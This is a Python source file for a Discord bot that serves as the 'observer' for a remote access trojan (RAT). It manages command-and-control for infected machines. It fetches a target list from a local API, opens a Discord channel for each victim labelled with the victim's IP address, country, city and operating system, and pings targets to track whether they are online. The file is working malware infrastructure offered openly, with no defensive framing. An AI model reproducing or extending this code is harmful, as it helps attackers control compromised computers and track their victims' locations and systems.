from asyncio import sleep
import asyncio
import os
import platform
import re
import json
import threading
import time
import discord
from discord.ext import commands
from dotenv import load_dotenv
import requests


load_dotenv()
__DISCORD_TARGETS_CHANNEL_ID    = int(os.environ.get("DISCORD_TARGETS_CHANNEL_ID")) # should be in int type!
__DISCORD_GUILD_ID              = int(os.environ.get("DISCORD_GUILD_ID")) # should be in int type!
__DISCORD_OBSERVER_TOKEN        = os.environ.get("DISCORD_OBSERVER_TOKEN") # should be in string type!
__API_BASE                      = "http://localhost:8000/api"
__CHECK_TARGETS_DELAY            = 60
__CHECK_TARGET_TIMEOUT           = 5
bot = commands.Bot(command_prefix="!")


def __get_channel_by_id(channel_id):
    guild = bot.get_guild(__DISCORD_GUILD_ID)
    return discord.utils.get(guild.channels, id=channel_id)


def check_if_channel_exists(channel_id):
    guild = bot.get_guild(__DISCORD_GUILD_ID)
    channel = discord.utils.get(guild.channels, id=channel_id)

    if channel:
        return True
    return False


async def __check_target_status(ctx):
    message_check = 'pong!'

    def check(message):
        return message.author.bot and message.content == message_check

    online = True

    try:
        await bot.wait_for('message', timeout=__CHECK_TARGET_TIMEOUT, check=check)
    except asyncio.TimeoutError:
        online = False

    response = requests.get(f"{__API_BASE}/targetmessagebyuuid/{ctx.channel.name}")

    if response.text:
        message = json.loads(response.text)
        message_id = message['message_id']
        target_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
        target_message = await target_channel.fetch_message(message_id)
        json_content = json.loads(target_message.content)
        json_content['online'] = online
        await target_message.edit(content = json.dumps(json_content))


async def check_targets():
    response = requests.get(f"{__API_BASE}/targets")

    if response.text:
        targets = json.loads(response.text)
        
        for target in targets:
            if check_if_channel_exists(target['channel_id']):
                requests.get(f"{__API_BASE}/ping/{target['identifier']}")
            else:
                await create_target_text_channel(target)


async def create_target_text_channel(target_data):
    guild = bot.get_guild(__DISCORD_GUILD_ID)
    target_channel = await guild.create_text_channel(target_data['identifier'], topic=f"IP: {target_data['metadata']['ip']} | COUTRY: {target_data['metadata']['country']} | CITY: {target_data['metadata']['city']} | OS: {target_data['metadata']['os']}")
    print(f"Created new channel: {target_channel}")

    targets_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
    targets = await targets_channel.history().flatten()

    for target in targets:
        target_message_data = json.loads(target.content)

        if target_data['channel_id'] == target_message_data['channel_id']:
            await target.delete()

    await check_targets()


def main():
    @bot.event
    async def on_ready():
        print('RAT OBSERVER ONLINE!')
        await check_targets()

    @bot.event
    async def on_message(message):
        if not message.author.bot:
            return

        if re.match(r'!ping',message.content):
            await ping(await bot.get_context(message))

    @bot.event
    async def on_guild_channel_create(channel):
        targets_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
        
        # get target metadata to json
        tmp = re.split(r'\s+\|\s+', channel.topic)
        metadata_list = list(map(lambda content: re.sub(r'^.+\:\s+', '',content), tmp))

        await targets_channel.send(json.dumps({
            'identifier': channel.name,
            'channel_id': channel.id,
            'metadata': {
                'ip': metadata_list[0],
                'country': metadata_list[1],
                'city': metadata_list[2],
                'os': metadata_list[3]
            },
            'online': True
        }))
        
    @bot.command()
    async def ping(ctx):
        await __check_target_status(ctx)
        await asyncio.sleep(__CHECK_TARGETS_DELAY)
        await check_targets()


    bot.run(__DISCORD_OBSERVER_TOKEN)

if __name__ == '__main__':
    main()